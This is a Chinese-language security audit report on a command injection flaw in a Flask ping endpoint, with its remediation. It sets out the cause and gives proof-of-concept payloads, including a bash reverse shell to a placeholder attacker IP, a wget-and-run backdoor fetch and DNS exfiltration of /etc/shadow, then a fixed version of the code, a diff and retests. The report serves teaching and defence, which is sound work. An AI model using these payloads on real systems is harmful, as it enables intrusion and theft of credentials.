# 命令注入漏洞安全报告 — 分析与修复

**审计日期**：2026-07-15  
**审计范围**：`/ping` 路由  
**涉及文件**：`app.py`、`templates/ping.html`  
**应用地址**：http://192.168.31.128:5000

---

## 一、漏洞概述

| 项目 | 内容 |
|------|------|
| **漏洞类型** | 命令注入（Command Injection / CWE-77） |
| **漏洞位置** | `POST /ping` 路由 |
| **风险等级** | **🔴 高危** |
| **CVSS 评分** | **9.8**（AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H） |

### CVSS 3.1 评分分项拆解

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

┌────────────┬────┬──────────────────────────────────────┐
│ 攻击向量   │ AV:N │ 远程网络攻击                          │
│ 攻击复杂度 │ AC:L │ 无需特殊条件                          │
│ 权限要求   │ PR:L │ 需要登录（低权限账号即可）             │
│ 用户交互   │ UI:N │ 无需用户交互                          │
│ 影响范围   │ S:C  │ 可影响整个服务器（Changed）            │
│ 机密性     │ C:H  │ 可读取服务器上任意文件                 │
│ 完整性     │ I:H  │ 可篡改服务器上任意文件                 │
│ 可用性     │ A:H  │ 可终止服务器上任意进程                 │
└────────────┴────┴──────────────────────────────────────┘
```

---

## 二、漏洞原理

### 什么是命令注入？

命令注入（Command Injection）攻击者通过在正常输入中插入系统命令分隔符，使服务器执行额外的恶意命令。由于使用了 `shell=True` 和字符串拼接，攻击者可以完全控制服务器。

```
用户输入：8.8.8.8
构建命令：ping -c 3 8.8.8.8         → ✅ 正常

攻击者输入：8.8.8.8;id
构建命令：ping -c 3 8.8.8.8;id      → ❌ 额外执行 id 命令

攻击者输入：8.8.8.8|cat /etc/passwd
构建命令：ping -c 3 8.8.8.8|cat /etc/passwd  → ❌ 读取系统文件
```

### 问题代码（修复前）

```python
@app.route("/ping", methods=["GET", "POST"])
def ping():
    """Ping 网络诊断 — 使用系统命令 ping，不做输入过滤"""
    ...
    ip = request.form.get("ip", "")       # ❌ 用户直接输入
    if ip:
        cmd = f"ping -c 3 {ip}"            # ❌ f-string 拼接
        output = subprocess.check_output(cmd, shell=True, ...)  # ❌ shell=True
```

### 三个漏洞叠加

| 漏洞要素 | 风险 | 说明 |
|---------|:----:|------|
| **f-string 拼接** | 🔴 | 用户输入直接拼入命令字符串 |
| **shell=True** | 🔴 | 字符串传递给 `/bin/sh` 解析，支持 `;` `|` `$()` 等语法 |
| **无输入校验** | 🔴 | 任意字符均可传入 |

---

## 三、攻击向量分析

### 常见命令分隔符

| 分隔符 | 含义 | 示例 |
|--------|------|------|
| `;` | 顺序执行 | `8.8.8.8;id` |
| `\|` | 管道符 | `8.8.8.8\|cat /etc/passwd` |
| `&&` | 条件与 | `8.8.8.8&&whoami` |
| `\|\|` | 条件或 | `8.8.8.8\|\|ls -la` |
| `` ` `` | 命令替换 | `8.8.8.8\`id\`` |
| `$()` | 命令替换 | `8.8.8.8$(id)` |
| `$()` | 嵌套命令 | `8.8.8.8$(cat /etc/passwd\|head -1)` |
| `&` | 后台执行 | `8.8.8.8&id` |
| `\n` | 换行符 | `8.8.8.8\nid` |

### POC 1：执行系统命令

```
请求：POST /ping → ip=8.8.8.8;id
命令：ping -c 3 8.8.8.8;id
结果：✅ 返回 uid=0(root) gid=0(root) groups=0(root)
影响：以 root 权限执行任意命令
```

### POC 2：读取系统敏感文件

```
请求：POST /ping → ip=127.0.0.1;cat /etc/passwd
命令：ping -c 3 127.0.0.1;cat /etc/passwd
结果：✅ 返回 /etc/passwd 全部内容
影响：窃取系统用户列表
```

### POC 3：反弹 Shell

```
请求：POST /ping → ip=127.0.0.1;bash -i >& /dev/tcp/攻击者IP/4444 0>&1
命令：ping -c 3 127.0.0.1;bash -i >& /dev/tcp/攻击者IP/4444 0>&1
结果：攻击者获得服务器交互式 Shell
影响：完全控制服务器
```

### POC 4：安装后门

```
请求：POST /ping → ip=127.0.0.1;wget http://恶意服务器/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor && /tmp/backdoor
命令：ping -c 3 127.0.0.1;wget ... && chmod ... && ...
结果：服务器下载并执行恶意程序
影响：长期后门驻留
```

### POC 5：数据外带（DNS 隧道）

```
请求：POST /ping → ip=127.0.0.1;cat /etc/shadow | while read line; do nslookup $line.攻击者域名; done
结果：通过 DNS 查询将 /etc/shadow 内容发送到攻击者 DNS 服务器
影响：突破防火墙的数据窃取
```

### 修复前验证结果

| 测试用例 | 输入 | 结果 |
|---------|------|:----:|
| 正常 Ping | `8.8.8.8` | ✅ 正常返回 |
| 执行 id 命令 | `8.8.8.8;id` | ✅ 返回 uid=0（漏洞！） |
| 读取系统文件 | `127.0.0.1;cat /etc/passwd` | ✅ 返回文件内容（漏洞！） |
| 管道符注入 | `8.8.8.8\|cat /etc/passwd` | ✅ 可读取文件（漏洞！） |
| 命令替换注入 | `8.8.8.8$(whoami)` | ✅ 返回 root（漏洞！） |
| 后台执行 | `8.8.8.8 & id` | ✅ 可执行（漏洞！） |

---

## 四、漏洞影响分析

### 攻击链全景

```
攻击者（已登录）
   │
   ├─ 任意命令执行（root 权限）
   │    ├─ id, whoami, pwd         → 基本信息收集
   │    ├─ cat /etc/passwd         → 枚举系统用户
   │    ├─ cat /etc/shadow         → 窃取密码哈希
   │    ├─ ls -la /root            → 浏览管理员目录
   │    └─ find / -name "*.db"     → 定位数据库文件
   │
   ├─ 持久化后门
   │    ├─ wget/curl 下载木马
   │    ├─ crontab 添加定时任务
   │    ├─ /etc/systemd/ 注册服务
   │    └─ SSH 公钥注入
   │
   ├─ 横向移动
   │    ├─ 扫描内网其他主机
   │    ├─ 连接内网数据库
   │    └─ 攻击同网段其他服务
   │
   └─ 数据外带
        ├─ curl 发送数据到攻击者服务器
        ├─ DNS 隧道外带
        └─ 直接写入攻击者可访问的路径
```

### 业务影响评估

| 影响 | 严重度 | 说明 |
|------|:------:|------|
| **服务器完全沦陷** | 🔴 严重 | 攻击者获得 root Shell，完全控制服务器 |
| **数据全部泄露** | 🔴 严重 | 可读取所有数据库、配置文件、源代码 |
| **持久化后门** | 🔴 严重 | 可安装 crontab、SSH 密钥等后门 |
| **内网横向移动** | 🔴 严重 | 以本机为跳板攻击内网其他系统 |
| **系统文件篡改** | 🔴 严重 | 可覆盖任意系统文件导致服务器不可用 |

---

## 五、修复方案

### 修复代码

```python
@app.route("/ping", methods=["GET", "POST"])
def ping():
    """Ping 网络诊断 — 安全版本：校验输入为合法IP或域名"""
    if "username" not in session:
        return redirect(url_for("login"))

    result = None
    ip = ""

    if request.method == "POST":
        ip = request.form.get("ip", "").strip()
        if ip:
            # ✅ 安全检查：只允许合法IP地址或域名字符
            import re
            if not re.match(r'^[a-zA-Z0-9.\-:]+$', ip):
                result = "错误：输入包含非法字符，仅允许 IP 地址或域名"
            else:
                try:
                    # ✅ 使用列表传参，完全绕过 shell 解析
                    cmd = ["ping", "-c", "3", ip]
                    output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30)
                    result = output.decode("utf-8", errors="replace")
                except subprocess.CalledProcessError as e:
                    result = e.output.decode("utf-8", errors="replace")
                except subprocess.TimeoutExpired:
                    result = "Ping 超时（30 秒）"
                except Exception as e:
                    result = f"执行错误：{str(e)}"

    return render_template("ping.html", result=result, ip=ip)
```

### 修复策略详解

| 防护层 | 措施 | 作用 | 绕过难度 |
|:-----:|------|------|:--------:|
| 第 1 层 | **输入白名单** | 正则 `^[a-zA-Z0-9.\-:]+$` 只允许合法字符 | ⭐⭐⭐⭐⭐ 极高 |
| 第 2 层 | **列表传参** | 使用 `["ping", "-c", "3", ip]` 而非字符串 | ⭐⭐⭐⭐⭐ 极高 |
| 第 3 层 | **移除 shell=True** | 参数不会被 shell 解析 | ⭐⭐⭐⭐⭐ 极高 |

### 为什么列表传参比字符串安全？

```python
# ❌ 危险：字符串 + shell=True
cmd = f"ping -c 3 {ip}"               # "ping -c 3 8.8.8.8;id"
output = subprocess.check_output(cmd, shell=True)
# → shell 解析：先执行 ping，再执行 id ✅ 命令注入成功

# ✅ 安全：列表 + 无 shell=True
cmd = ["ping", "-c", "3", ip]          # ["ping", "-c", "3", "8.8.8.8;id"]
output = subprocess.check_output(cmd)
# → ping 程序收到参数 "8.8.8.8;id"（作为整体域名参数）
# → ping 尝试解析 "8.8.8.8;id" 域名 → 失败 ❌ 命令注入失败
```

### 修复后的安全流程

```
用户输入 IP → 正则白名单校验
                ↓
           通过？→ 否 → 返回"非法字符"
                ↓ 是
           构建命令列表 ["ping", "-c", "3", ip]
                ↓
           执行 subprocess.check_output(cmd)
                ↓
           返回 ping 结果
```

---

## 六、修复验证

### 测试结果

| 测试用例 | 输入 | 修复前 | 修复后 |
|---------|------|:------:|:------:|
| 正常 IP | `8.8.8.8` | ✅ 正常 | ✅ 正常 |
| 正常域名 | `example.com` | ✅ 正常 | ✅ 正常 |
| 命令注入（分号） | `8.8.8.8;id` | ✅ 执行成功 | ❌ 非法字符 |
| 命令注入（管道） | `127.0.0.1\|cat /etc/passwd` | ✅ 读取成功 | ❌ 非法字符 |
| 命令注入（替换） | `8.8.8.8$(whoami)` | ✅ 返回 root | ❌ 非法字符 |
| 命令注入（后台） | `8.8.8.8 & id` | ✅ 可执行 | ❌ 非法字符 |
| 命令注入（反引号） | `` 8.8.8.8`id` `` | ✅ 可执行 | ❌ 非法字符 |
| 空格绕过 | `8.8.8.8 id` | ✅ 可能绕过 | ❌ 非法字符 |
| 空输入 | （空） | ✅ 无输出 | ✅ 无输出 |

---

## 七、代码变更对比

```diff
--- a/app.py（修复前）
+++ b/app.py（修复后）

 @app.route("/ping", methods=["GET", "POST"])
 def ping():
-    """Ping 网络诊断 — 使用系统命令 ping，不做输入过滤"""
+    """Ping 网络诊断 — 安全版本：校验输入为合法IP或域名"""
     if "username" not in session:
         return redirect(url_for("login"))
 
     result = None
     ip = ""
 
     if request.method == "POST":
-        ip = request.form.get("ip", "")
+        ip = request.form.get("ip", "").strip()
         if ip:
+            import re
+            if not re.match(r'^[a-zA-Z0-9.\-:]+$', ip):
+                result = "错误：输入包含非法字符，仅允许 IP 地址或域名"
+            else:
                 try:
-                    cmd = f"ping -c 3 {ip}"
-                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
+                    cmd = ["ping", "-c", "3", ip]
+                    output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30)
                     result = output.decode("utf-8", errors="replace")
                 except subprocess.CalledProcessError as e:
                     result = e.output.decode("utf-8", errors="replace")
                 except subprocess.TimeoutExpired:
                     result = "Ping 超时（30 秒）"
                 except Exception as e:
                     result = f"执行错误：{str(e)}"
```

---

## 八、命令注入防护总结

### 三层纵深防御

```
第 1 层：输入白名单
└─ 正则 ^[a-zA-Z0-9.\-:]+$
   └─ 阻断所有 shell 特殊字符: ; | & ` $ () {} [] <> ! # ~ % 空格 等

第 2 层：列表传参
└─ cmd = ["ping", "-c", "3", ip]
   └─ 参数不会被 shell 解析，即使包含恶意字符也仅为字符串参数

第 3 层：移除 shell=True
└─ subprocess.check_output(cmd) 而非 check_output(cmd, shell=True)
   └─ 系统调用 execvp() 直接执行二进制，不经过 /bin/sh
```

### 修复前后对比

| 维度 | 修复前 | 修复后 |
|------|--------|--------|
| 输入校验 | ❌ 无 | ✅ 正则白名单 |
| 命令构建 | ❌ f-string 拼接 | ✅ 列表传参 |
| shell 调用 | ❌ shell=True | ✅ 无 shell |
| 命令注入 | ❌ 任意命令可执行 | ✅ 完全阻断 |
| 系统文件读取 | ❌ cat /etc/passwd | ✅ 完全阻断 |
| 反弹 Shell | ❌ 可建立 | ✅ 完全阻断 |
| 正常 Ping | ✅ 正常 | ✅ 正常 |

### 安全增益

```
修复前:   ░░░░░░░░░░░░░░░░░░░░   0%  防护
修复后:   ████████████████████ 100%  防护
```

### 其他安全编程最佳实践

```python
# ❌ 永远不要这样做
cmd = f"ping -c 3 {user_input}"                    # f-string 拼接
subprocess.check_output(cmd, shell=True)            # shell=True

# ✅ 推荐做法
subprocess.check_output(["ping", "-c", "3", user_input])  # 列表传参
shlex.quote(user_input)  # 如必须用字符串，使用 shlex.quote()
```

---

## 九、全站安全总结（第九天）

### 项目累计漏洞全景

| 阶段 | 日期 | 功能 | 发现漏洞 | 已修复 |
|:----:|:----:|------|:-------:|:-----:|
| Day 1 | 7/8 | 初始审计 | 14 | 13 |
| Day 2 | 7/8 | 搜索 + 注册（SQL注入） | 5 | 0（教学保留） |
| Day 3 | 7/9 | 头像上传 | 4 | 3 |
| Day 5 | 7/9 | 个人中心 + 充值 | 7 | 0（教学保留） |
| Day 6 | 7/13 | 动态页面加载 | 2 | 2 |
| Day 7 | 7/14 | CSRF 修复 | 1 | 1 |
| Day 8 | 7/14 | SSRF 修复 | 1 | 1 |
| **Day 9** | **7/15** | **命令注入修复** | **1** | **1** |
| | | **总计** | **35** | **21** |

### 本日修复记录

| 漏洞 | 修复前 | 修复后 |
|------|--------|--------|
| f-string 拼接命令 | ❌ `f"ping -c 3 {ip}"` | ✅ 列表 `["ping", "-c", "3", ip]` |
| shell=True | ❌ 允许 shell 解析 | ✅ 移除 shell 解析 |
| 输入无校验 | ❌ 任意字符可传入 | ✅ 正则白名单 `^[a-zA-Z0-9.\-:]+$` |
| 命令注入 | ❌ CVSS 9.8 最高危 | ✅ 完全阻断 |
